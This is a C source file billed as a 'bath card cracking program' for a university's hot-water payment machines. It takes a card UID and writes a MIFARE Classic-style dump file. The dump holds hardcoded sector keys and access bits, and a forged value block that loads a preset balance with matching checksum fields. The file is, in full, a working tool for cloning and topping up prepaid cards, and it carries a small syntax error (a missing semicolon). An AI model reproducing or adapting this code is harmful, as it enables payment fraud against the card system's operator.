/*
惠州学院名能科技热水机用
by 红楼宝玉
*/
#include<stdio.h>
#include<stdlib.h>
int mi(char);
void zu(int);
char uidline[16] = { 0x00,0x00,0x00,0x00,0x00,0x08,0x04,0x00,0xad,0xbf,0x11,0x09,0x7a,0x80,0x64,0x8c };
char zero[16] = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
char oni[16] = { 0x00,0xff,0xff,0xff,0xff,0x81,0x7f,0x07,0x88,0x69,0xa9,0xde,0x7f,0x3c,0xeb,0x1f };
char ff00[16] = { 0xff,0x00,0x00,0x00,0x00,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
char ga[16] = { 0x5f,0x38,0x03,0xef,0x46,0xc7,0xaa,0x00,0xa1,0x01,0x01,0x00,0x00,0x01,0x00,0x7b };
char mon[16] = { 0x00,0x00,0x20,0x4E,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
char w5[16] = { 0xE3,0x38,0x03,0xEF,0x46,0xC7,0xAA,0x00,0xA0,0x01,0x4E,0xD3,0x00,0x21,0x01,0x3A };

int r;
char input[8];
FILE *file;
char name[10] = { 0x60,'.','d','u','m','p',0x00 };
int main(void)
{
	printf("---------惠州学院洗澡卡破解程序--------")
	while (1)
	{
		printf("Input the UID(q to exit):");
		scanf("%s", &input);
		if (input[0] == 'q' || input[0] == 'Q')
			exit(0);
		name[0]++;
		file = fopen(name, "wb");
		for (r = 0; r < 4; ++r)
			uidline[r] = (char)((mi(input[2 * r]) << 4) + mi(input[2 * r + 1]));
		uidline[4] = uidline[0] ^ uidline[1] ^ uidline[2] ^ uidline[3];
		for (r = 0; r < 4; ++r)
			oni[r + 1] = ~(uidline[r]);
		fwrite(uidline, sizeof(char), 16, file);
		fwrite(zero, sizeof(char), 16, file);
		fwrite(zero, sizeof(char), 16, file);
		fwrite(oni, sizeof(char), 16, file);
		zu(7);

		fwrite(ff00, sizeof(char), 16, file);
		fwrite(w5, sizeof(char), 16, file);
		fwrite(ff00, sizeof(char), 16, file);
		oni[0]++;
		fwrite(oni, sizeof(char), 16, file);
	
		mon[1] = mon[2] + mon[3] + mon[4];
		mon[0] = ~(mon[2] ^ mon[3] ^ mon[4]);
		mon[5] = ~(mon[1]);
		mon[15] = mon[5] + 1;
		fwrite(mon, sizeof(char), 16, file);
		fwrite(w5, sizeof(char), 16, file);
		fwrite(mon, sizeof(char), 16, file);
		oni[0]++;
		fwrite(oni, sizeof(char), 16, file);

		fwrite(ff00, sizeof(char), 16, file);
		fwrite(ga, sizeof(char), 16, file);
		fwrite(ff00, sizeof(char), 16, file);
		oni[0]++;
		fwrite(oni, sizeof(char), 16, file);
		fwrite(ff00, sizeof(char), 16, file);
		fwrite(ga, sizeof(char), 16, file);
		fwrite(ff00, sizeof(char), 16, file);
		oni[0]++;
		fwrite(oni, sizeof(char), 16, file);
		
		zu(4);
		fclose(file);
		printf("DONE~on%s\n",name);
	}
}

int mi(char r)
{
	switch (r)
	{
	case '0':return 0;
	case '1':return 1;
	case '2':return 2;
	case '3':return 3;
	case '4':return 4;
	case '5':return 5;
	case '6':return 6;
	case '7':return 7;
	case '8':return 8;
	case '9':return 9;
	case 'a':case 'A':return 10;
	case 'b':case 'B':return 11;
	case 'c':case 'C':return 12;
	case 'd':case 'D':return 13;
	case 'e':case 'E':return 14;
	case 'f':case 'F':return 15;
	}
}

void zu(int r)
{
	int si;
	for (si = 0; si < r; ++si)
	{
		fwrite(zero, sizeof(char), 16, file);
		fwrite(zero, sizeof(char), 16, file);
		fwrite(zero, sizeof(char), 16, file);
		oni[0]++;
		fwrite(oni, sizeof(char), 16, file);

	}
}

